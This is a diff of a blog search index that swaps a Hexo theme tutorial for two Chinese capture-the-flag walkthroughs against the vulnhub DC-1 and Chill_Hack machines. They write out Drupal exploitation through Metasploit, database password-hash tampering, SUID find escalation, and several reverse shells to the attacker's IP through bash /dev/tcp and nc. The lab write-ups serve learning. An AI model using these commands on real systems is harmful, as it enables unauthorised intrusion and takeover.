@@ -1,58 +1,337 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hexo的next主题实现双语功能</title>
-    <url>/article/99e78227.html</url>
-    <content><![CDATA[<h1 id="Hexo的next主题实现双语功能"><a href="#Hexo的next主题实现双语功能" class="headerlink" title="Hexo的next主题实现双语功能"></a>Hexo的next主题实现双语功能</h1><a id="more"></a>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久,给博客添加了Google Analytics,通过数据显示,发现我这小破站寥寥无几的流量大部分竟然是国外朋友贡献的,心中便想着将博客国际化—-搞个英文版本.说干就干,经过我的一番折腾,终于给搞出来了,但我要说明一下文章的内容是要自己转换为英文,具体效果大家可以点击下面链接前往查看</p>
-<p><a href="https://en.idefun.com/" class="LinkCard" target="_blank">英文版本</a></p>
-<h2 id="诉求"><a href="#诉求" class="headerlink" title="诉求"></a>诉求</h2><p>首先说说我对英文网站的诉求:</p>
-<ol>
-<li>英文网站要与原网站的结构外观基本保持一致(我看到有的小伙伴直接换支持双语的主题了,我可不想让自己的心血白流)</li>
-<li>我希望原网站和英文网站有个切换按钮,很容易切换</li>
-</ol>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>在hexo本地目录创建英文文件夹(名字自定义),我的是en</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320154606919.png" alt=""></p>
-<p>复制hexo目录的内容(node_modules除外)到en文件夹,复制后en文件夹如下</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320154912791.png" alt=""></p>
-<p>安装相关插件,在en文件夹使用命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
-<p>修改en文件夹中_config.yml文件,将下图中的language改为en,可以比对着hexo本地目录的_config.yml文件将中文改为相应的英文(如下图的title,subtitle等)</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320155305119.png" alt=""></p>
-<p>修改hexo目录next主题配置文件_config.yml文件,找到menu字段,增添language菜单,注意链接要换成自己的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">language: https:&#x2F;&#x2F;en.idefun.com&#x2F; || fa fa-language</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320155819757.png" alt=""></p>
-<p>修改next主题文件夹下的languages中的zh-CN.yml,找到menu,添加language:English</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160213558.png" alt=""></p>
-<p>可以在hexo目录使用hexo s查看效果</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160423212.png" alt=""></p>
-<p>同理,修改en文件夹中next主题配置文件_config.yml文件,找到menu字段,增添中文菜单</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">中文: https:&#x2F;&#x2F;www.idefun.com&#x2F; || fa fa-language</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160547373.png" alt=""></p>
-<p>修改en文件夹下themes中next主题文件夹下的languages中的en.yml,找到menu,添加language:中文</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160801285.png" alt=""></p>
-<p>可以在en目录使用hexo s查看效果</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160357274.png" alt=""></p>
-<h3 id="部署配置"><a href="#部署配置" class="headerlink" title="部署配置"></a>部署配置</h3><p>下面提供两种部署方法,第一种不用再创建仓库,第二种要再创建仓库,若想要给英文博客绑定域名建议选择第二种,关于创建仓库及打开github page就不多说了</p>
-<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在en文件夹生成英文博客,并将生成的public文件夹中的内容复制到hexo目录下的public文件夹中的en文件夹,推送时只需在hexo目录下推送</p>
-<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>使用下面命令即可实现</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; cd en &amp;&amp;  hexo clean &amp;&amp; hexo g &amp;&amp; cd ..&#x2F; &amp;&amp; cp -r en&#x2F;public&#x2F;. public&#x2F;en&#x2F; &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
-<p>可以写成shell脚本,我这里提供一份简单的脚本供大家参考</p>
-<p><a href="https://idefun.lanzous.com/i4cz6n4ov7e" class="LinkCard">点击下载</a></p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320162843893.png" alt=""></p>
-<p>下载后改后缀为sh即可双击运行</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320162956255.png" alt=""></p>
-<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>在en文件夹生成英文博客,将生成英文博客推送到一个新的仓库,需要分别推送,可以编写相应脚本来简化操作</p>
-<h5 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h5><p>修改en文件夹在_config.yml文件,找到deploy字段,修改为自己的仓库即可</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320163232780.png" alt=""></p>
-<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>为大家提供一种思路,希望有帮助</p>
+    <title>基于vulnhub的DC-1靶机的渗透测试</title>
+    <url>/article/64755983.html</url>
+    <content><![CDATA[<h1 id="基于vulnhub的DC-1靶机的渗透测试"><a href="#基于vulnhub的DC-1靶机的渗透测试" class="headerlink" title="基于vulnhub的DC-1靶机的渗透测试"></a>基于vulnhub的DC-1靶机的渗透测试</h1><a id="more"></a>
+<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>靶机下载:<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+<p>DC1需要找到5个flag,最终目标是在root的主目录中找到并读取该标志！</p>
+<p>kali要桥接</p>
+<p><img src="https://i.loli.net/2021/05/01/grdcAYKiPbMNpV7.png" alt=""></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看kali的IP</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501205202.png" alt=""></p>
+<p>发现IP为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.101</span><br></pre></td></tr></table></figure>
+<p>使用nmap扫描靶机IP</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501212931.png" alt=""></p>
+<p>其中192.168.1.107是我本机IP,则靶机可能的IP为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.102</span><br><span class="line">192.168.1.103</span><br><span class="line">192.168.1.106</span><br></pre></td></tr></table></figure>
+<p>接下来ping测试</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213056.png" alt=""></p>
+<p>发现192.168.1.103和192.168.1.106ping不通,则靶机ip为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.102</span><br></pre></td></tr></table></figure>
+<p>继续查看端口开放状态</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.1.102 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213136.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213221.png" alt=""></p>
+<p>发现开放了22端口(ssh),80端口(http),111和60431端口,并且采用的是Drupal 7框架,有个robots.txt</p>
+<h2 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h2><p>访问网站</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501113313.png" alt=""></p>
+<p>判断为动态网站</p>
+<p>查看robots.txt</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501113754.png" alt=""></p>
+<p>没有发现有用的信息</p>
+<p>目录扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.102</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501215026.png" alt=""></p>
+<p>发现几个可疑目录</p>
+<p>admin,root,user,/includes/Root,访问后如下</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501144842.png" alt=""></p>
+<p>使用Metasploit framework搜索Drupal</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501215550.png" alt=""></p>
+<p>尝试利用第一个</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_coder_exec </span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224120.png" alt=""></p>
+<p>接下来需要配置rhost,如果第一次使用可能需还要配置lhost和lport,即监听机的ip和端口</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224144.png" alt=""></p>
+<p>然后<code>exploit</code> 或者 <code>run</code></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224525.png" alt=""></p>
+<p>发现失败了</p>
+<p>尝试第二个,发现成功</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501225506.png" alt=""></p>
+<p>执行命令shell命令获得shell</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501225936.png" alt=""></p>
+<p>使用python反弹shell,获得更好的交互体验</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230108.png" alt=""></p>
+<p>使用<code>ls</code>查看当前目录下文件</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230609.png" alt=""></p>
+<p>发现有个flag1.txt文件,使用cat命令查看</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230659.png" alt=""></p>
+<p>flag1:“每一个好的内容管理系统 都需要一个配置文件”——配置文件里面肯定有东西</p>
+<p>进入sites/dafault,发现有个settings.php</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501231119.png" alt=""></p>
+<p>查看settings.php</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090130.png" alt=""></p>
+<p>发现flag2</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag2</span><br><span class="line">Brute force and dictionary attacks aren&#39;t the</span><br><span class="line">only ways to gain access (and you WILL need access).</span><br><span class="line">What can you do with these credentials?</span><br></pre></td></tr></table></figure>
+<p>同时发现数据库的库名(drupaldb),用户名(dbuser)和密码(R0ck3t)</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090619.png" alt=""></p>
+<p>尝试登录数据库</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"><span class="meta">#</span><span class="bash"> 登陆数据库</span></span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 drupaldb 数据库</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090808.png" alt=""></p>
+<p>查询users表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502091533.png" alt=""></p>
+<p>发现有两个用户admin和Fred,但密码经过加密</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502091605.png" alt=""></p>
+<p>退出数据库,尝试修改admin的密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/</span><br><span class="line">php scripts/password-hash.sh 123 &gt; pwd.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">将123通过哈希加密</span></span><br><span class="line">cat pwd.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092100.png" alt=""></p>
+<p>得到’123’哈希加密后的密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$S$D0jEFt4XLx.7zA5.tCIDN2GBMsL2W6jtMxr6fE7Lt&#x2F;Mct6ctCkqD</span><br></pre></td></tr></table></figure>
+<p>进入数据库,修改admin密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库</span></span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 drupaldb 数据库</span></span><br><span class="line">update users set pass = &#x27;$S$D0jEFt4XLx.7zA5.tCIDN2GBMsL2W6jtMxr6fE7Lt/Mct6ctCkqD&#x27; where name = &#x27;admin&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将密码改为123</span></span><br><span class="line">truncate flood;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果错误密码太多被锁定的话，这条语句可以解除锁定</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092505.png" alt=""></p>
+<p>此时查看users表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p>可见admin的密码已经修改为123哈希加密后的密码</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092551.png" alt=""></p>
+<p>登录网站后台</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092737.png" alt=""></p>
+<p>登录成功</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093157.png" alt=""></p>
+<p>点击Find content</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093233.png" alt=""></p>
+<p>发现flag3,点击edit查看</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093329.png" alt=""></p>
+<p>得到flag3</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line"><span class="meta">#</span><span class="bash">提示我们使用find执行操作</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093407.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093825.png" alt=""></p>
+<p>未发现有用的信息,查看/etc/passwd</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>发现有个flag4的用户</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502094002.png" alt=""></p>
+<p>进入flag4目录,发现有个flag4.txt,查看得到flag4</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095721.png" alt=""></p>
+<p>flag4</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+<p>接下来尝试获取最终flag</p>
+<p>方法一:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find ./ aaa -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>
+<p>得到root权限</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502094419.png" alt=""></p>
+<p>方法二:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find flag4.txt -exec nc -lvp 2333 -e /bin/sh \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机开启监听</span></span><br><span class="line">nc 192.168.1.102 2333</span><br><span class="line"><span class="meta">#</span><span class="bash">渗透主机连接shell</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095521.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095600.png" alt=""></p>
+<p>查看/root目录</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095637.png" alt=""></p>
+<p>得到thefinalflag</p>
 ]]></content>
       <categories>
-        <category>hexo</category>
+        <category>Hack</category>
       </categories>
       <tags>
-        <tag>hexo</tag>
-        <tag>next</tag>
+        <tag>Hack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于vulnhub的Chill_Hack靶机的渗透测试</title>
+    <url>/article/d0f0a8c5.html</url>
+    <content><![CDATA[<h1 id="基于vulnhub的Chill-Hack靶机的渗透测试"><a href="#基于vulnhub的Chill-Hack靶机的渗透测试" class="headerlink" title="基于vulnhub的Chill_Hack靶机的渗透测试"></a>基于vulnhub的Chill_Hack靶机的渗透测试</h1><a id="more"></a>
+<h2 id="一-实验准备"><a href="#一-实验准备" class="headerlink" title="一.实验准备"></a>一.实验准备</h2><p>kali,Chill_Hack靶机</p>
+<p>kali要选择NAT方式连接</p>
+<p><img src="https://i.loli.net/2021/04/27/gMoeEk87L2GwQhc.png" alt=""></p>
+<h2 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h2><h3 id="1-收集靶机IP"><a href="#1-收集靶机IP" class="headerlink" title="1.收集靶机IP"></a>1.收集靶机IP</h3><p>查看kali的IP,如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426170748334.png" alt=""></p>
+<p>用nmap扫描存活的主机</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.88.0/24  </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171053710.png" alt=""></p>
+<p>判断靶机IP,根据ping测试的ttl值判断目标靶机IP为192.168.88.139</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171143353.png" alt="image-20210426171143353"></p>
+<p>确定目标靶机IP是192.168.101.139</p>
+<h3 id="2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态"><a href="#2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态" class="headerlink" title="2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态"></a>2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态</h3><p>使用nmap扫描相应的端口及服务的开发情况</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.88.139 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/27/3u7WfI1zq2pOLbh.png" alt=""></p>
+<p><img src="https://i.loli.net/2021/04/27/IF6QzsTh9Bkx5KR.png" alt=""></p>
+<p>查询结果如下,发现21(FTP),80(HTTP),22(SSH)端口处于开放状态</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175334078.png" alt=""></p>
+<p>发现FTP服务允许匿名登录(Anonymous FTP login allowed);SSH,HTTP服务启动</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426180937065.png" alt=""></p>
+<h3 id="3-根据开放的端口及服务查询相应服务的漏洞"><a href="#3-根据开放的端口及服务查询相应服务的漏洞" class="headerlink" title="3.根据开放的端口及服务查询相应服务的漏洞"></a>3.根据开放的端口及服务查询相应服务的漏洞</h3><h4 id="利用FTP服务漏洞"><a href="#利用FTP服务漏洞" class="headerlink" title="利用FTP服务漏洞"></a>利用FTP服务漏洞</h4><p>根据nmap查询结果发现21端口允许匿名用户登录,存在<a href="https://www.jianshu.com/p/9498ccf62348">匿名登录漏洞</a></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175649800.png" alt=""></p>
+<p>匿名登录ftp,下载并查看note.txt</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.101.129</span><br><span class="line"><span class="meta">#</span><span class="bash">输入匿名用户用户名Anonymous及密码登录</span></span><br><span class="line">get note.txt #下载note.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426180549492.png" alt=""></p>
+<p>并未能提供有效信息</p>
+<h4 id="利用HTTP"><a href="#利用HTTP" class="headerlink" title="利用HTTP"></a>利用HTTP</h4><p>80端口是Apache httpd 2.4.29 可能存在<a href="https://cloud.tencent.com/developer/article/1676145">换行解析漏洞</a></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426185523428.png" alt=""></p>
+<p>打开网站判断是静态网站还是动态网站,发现是个静态网站,没有可利用的后台数据库,没有漏洞点</p>
+<p><img src="https://i.loli.net/2021/04/27/WSPdvcLpRNF34hu.png" alt=""></p>
+<p>继续对网站的目录进行探测(使用使用目录扫描工具dirb)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.88.139</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/QrlZORBogVxzby7.png" alt=""></p>
+<p>发现secret目录,可能存在命令执行漏洞</p>
+<p><img src="https://i.loli.net/2021/04/26/HRVSi54yGpbgY6B.png" alt=""></p>
+<p>浏览器输入网址,发现好像可以运行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.139&#x2F;secret&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/zZ1JTYuI8BtW6Aw.png" alt=""></p>
+<p>输入ls查看当前目录下文件,发现ls命令被过滤,不允许使用</p>
+<p><img src="https://i.loli.net/2021/04/26/ZaXyHArhQ1xnpjz.png" alt=""></p>
+<p>输入pwd查看当前位置</p>
+<p><img src="https://i.loli.net/2021/04/26/9PVKRD7v5nXMlWo.png" alt=""></p>
+<h2 id="三-边界突破"><a href="#三-边界突破" class="headerlink" title="三.边界突破"></a>三.边界突破</h2><h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>使用NetCat开启监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.freebuf.com/articles/web/247967.html">反弹shell</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.88.136/6666 0&gt;&amp;1 #失败</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/xr6ykvZJIEgtlNi.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.88.136 6666&gt;/tmp/f#成功</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/e1YCjQZcLGVwB7b.png" alt=""></p>
+<p>反弹shell成功</p>
+<p><img src="https://i.loli.net/2021/04/26/J6zWLx7XdiFhrtG.png" alt=""></p>
+<p>使用id命令查看用户的ID,以及所属群组的ID,可以看出www-data用户权限较低</p>
+<p><img src="https://i.loli.net/2021/04/26/WZxJvmg8XQhpjT5.png" alt=""></p>
+<p>进入根目录并查看</p>
+<p><img src="https://i.loli.net/2021/04/26/xlQOi9ECqhtoVHw.png" alt=""></p>
+<p>查看相关目录,仍未获得有用的信息</p>
+<p><img src="https://i.loli.net/2021/04/26/ZK92yTH3rQGWJnO.png" alt=""></p>
+<p>查看home目录,发现有三个用户(anurodh,apaar,aurick)</p>
+<p><img src="https://i.loli.net/2021/04/26/xLRowz5KbQpe8m9.png" alt="image-20210426195916513"></p>
+<p>尝试进入各用户目录,发现能进入apaar目录</p>
+<p><img src="https://i.loli.net/2021/04/26/m1eNVnqGAHOds4g.png" alt=""></p>
+<p>查看apaar目录发现local.txt(无法查看),</p>
+<p><img src="https://i.loli.net/2021/04/26/cvKBTFymJCqstkg.png" alt=""></p>
+<h3 id="2-横向扩展"><a href="#2-横向扩展" class="headerlink" title="2.横向扩展"></a>2.横向扩展</h3><p>使用sudo -l查看所能执行的高权限指令和文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>发现.helpline.sh</p>
+<p><img src="https://i.loli.net/2021/04/26/gWeUCuE7mXAYc6R.png" alt=""></p>
+<p>查看/home/apaar/.helpline.sh</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /home/apaar/.helpline.sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/lnSWQ9TuaN81hFg.png" alt=""></p>
+<p>发现该脚本允许输入,尝试输入一些命令查看local.txt</p>
+<p>运行.helpline.sh</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./.helpline.sh</span><br></pre></td></tr></table></figure>
+<p>输入命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
+<p>无法查看</p>
+<p><img src="https://i.loli.net/2021/04/26/IcbgH6snUFLiQJD.png" alt=""></p>
+<p>尝试使用apaar用户查看</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u 用户名 ./.helpline.sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/51TseuLIp9WqPHR.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww&#125;</span><br></pre></td></tr></table></figure>
+<p>最终拿到用户flags</p>
+<p>继续尝试寻找root的flags</p>
+<p>继续寻找可疑信息,发现/var/www/files下有可疑文件</p>
+<p><img src="https://i.loli.net/2021/04/26/KVMgwEY4Gtx6NCq.png" alt=""></p>
+<p>查看hacker.php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacker.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/xYzkO8smG1anLwu.png" alt=""></p>
+<p>发现img标签中指向一个可以图片,使用nc下载可疑图片</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; hacker.jpg #kali新开shell</span><br><span class="line">nc 192.168.88.136 5555 &lt; images/hacker-with-laptop_23-2147985341.jpg #反弹shell中</span><br></pre></td></tr></table></figure>
+<p>打开图片如下</p>
+<p><img src="https://i.loli.net/2021/04/26/9ZLNSD5MKgaWYvR.png" alt=""></p>
+<p>考虑有没有可能使用隐写术隐藏关键内容</p>
+<p>隐写术实例</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy /b 2.jpg+1.zip output.jpg</span><br></pre></td></tr></table></figure>
+<p>下载steghide工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install steghide</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/4GZH96DKicq3Q7a.png" alt=""></p>
+<p>查看图片中是否隐藏有内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide info hacker.jpg</span><br></pre></td></tr></table></figure>
+<p>发现其中嵌入了一个名为backup.zip的压缩包</p>
+<p><img src="https://i.loli.net/2021/04/26/8NyOtZcnaJ49qSs.png" alt=""></p>
+<p>使用steghide获取该压缩包</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide extract -sf hacker.jpg </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/jXtNpaoLSscUIiR.png" alt=""></p>
+<p>查看backup.zip中的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -sf backup.zip</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/RobJ241uzjhLeT6.png" alt=""></p>
+<p>尝试解压该压缩包</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
+<p>发现需要密码</p>
+<p><img src="https://i.loli.net/2021/04/26/NnXZfyUhDF6ri2Q.png" alt=""></p>
+<p>使用John爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">先将backup.zip转换成backup.john</span></span><br><span class="line">zip2john backup.zip &gt; backup.john</span><br><span class="line"><span class="meta">#</span><span class="bash">再使用john爆破</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip</span><br></pre></td></tr></table></figure>
+<p>发现密码为pass1word</p>
+<p><img src="https://i.loli.net/2021/04/26/2WpkaEDAVzqw91F.png" alt=""></p>
+<p>解压backup.zip</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/q4ajLeMKOh6zWJ9.png" alt=""></p>
+<p>获得source_code.php文件</p>
+<p><img src="https://i.loli.net/2021/04/26/QLvoqj1XDGWV7UT.png" alt=""></p>
+<p>查看source_code.php,发现可疑密码和用户名</p>
